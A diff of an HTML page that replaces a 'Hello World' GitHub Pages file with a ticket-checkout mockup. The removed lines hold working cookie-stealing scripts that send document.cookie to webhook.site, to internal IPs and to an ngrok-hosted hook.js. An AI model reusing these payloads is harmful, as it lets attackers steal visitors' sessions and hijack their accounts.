@@ -1,23 +1,85 @@
 <!DOCTYPE html>
 <html>
+<head>
+  <link rel="stylesheet" href="style.css">
+  <script src="script.js"></script>
+</head>
 <body>
-<h1>Hello World</h1>
-<p>I'm hosted with GitHub Pages.asdasd</p>
-<!--   <script src='https://b68c1896ab82.ap.ngrok.io/hook.js'></script> -->
-<!--   <script>var i=new Image;i.src="http://172.30.0.150:3000/?"+document.cookie;</script> -->
-<!--   <script>var i=new Image;i.src="http://10.0.2.15:3000/?"+document.cookie;</script> -->
-  <script>var i=new Image;i.src="http://10.0.2.15:8888/?"+document.cookie;</script>
-  
-  <script>
-    document.write('<img src="https://webhook.site/3993334f-ba2b-44cd-a4c8-0431399b1a82?c='+document.cookie+'" />');
-  </script>
-  
-<!--   <script>
-    alert(document.cookie);
-    var i=new Image;
-    i.src="http://172.30.0.150:8888/?"+document.cookie;
-  </script> -->
-  
-  
+
+  <div class="main">
+    <div class="left">
+      <div class="box">
+        <h3 class="tickbox">Delivery</h3>
+        <h4> Mobile Entry - Free</h4>
+        <p> Tickets Available by Sun Apr 3, 2022</p>
+        <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Cras et mattis eros. Curabitur at sem vestibulum, luctus sem vitae, convallis augue.</p>
+      </div>
+      <div class="box">
+        <h3 class="tickbox">Payment</h3>
+        <h4>Use Credit / Debit Card</h4>
+        <div class="payment-choice visa js-active">
+          <input type="radio">
+          <div class="inner">
+            <img src="" />
+            <div class="visa-elements">
+              <h5>Visa - 9999</h5>
+              <p>User Name | exp. 00/11</p>
+              <p><a href="#">Edit</a> | <a href="#"Delete</a></p>
+            </div>
+          </div>
+        </div>
+        <div class="new-card">
+          <button>+</button>
+          <img src="" />
+          <h5>Add New Card</h5>
+        </div>
+        <h5>Or Pay With</h5>
+        <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Cras et mattis eros. Curabitur at sem vestibulum, luctus sem vitae, convallis <a href="#">augue</a></p>
+      </div>
+    </div>
+    <!-- left -->
+    <div class="right">
+      <div class="total">
+        <h3>Total</h3>
+        <h3 class="amount">$0.00</h3>
+      </div>
+      <div class="tickets">
+        <h4>Tickets</h4>
+        <div class="inner">
+          <p>Lorem ipsum: $220.00 x 2</p>
+          <p>$00.00</p>
+        </div>
+      </div>
+      <div class="seller-notes">
+        <h4>Notes from Seller</h4>
+        <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Cras et mattis eros. Curabitur at sem vestibulum, luctus sem vitae, convallis.</p>
+      </div>
+      <div class="fees">
+        <h4>Fees</h4>
+        <div class="service-fee">
+          <p>Service Fee:</p>
+          <p>$00.00</p>
+        </div>
+        <div class="order-processing">
+          <p>Order Processing Fee</p>
+          <p>$00.00</p>
+        </div>
+      </div>
+      <div class="delivery">
+        <p>Mobile Entry</p>
+        <p>Free</p>
+      </div>
+      <a href="#" class="cancel"><p>Cancel Order</p></a>
+      <p>*All Sales Final - No Refunds</p>
+      <div class="terms">
+        <input type="radio">
+        <p> I have read and agree to the current <a href="#">Terms of Use</a></p>
+      </div>
+      <input type="submit" class="submit" value="Place Order">
+      <p><small>*Exceptions may apply, see our <a href="#">Terms of Use</a></small></p>
+    </div>
+  </div>
+
+
 </body>
 </html>
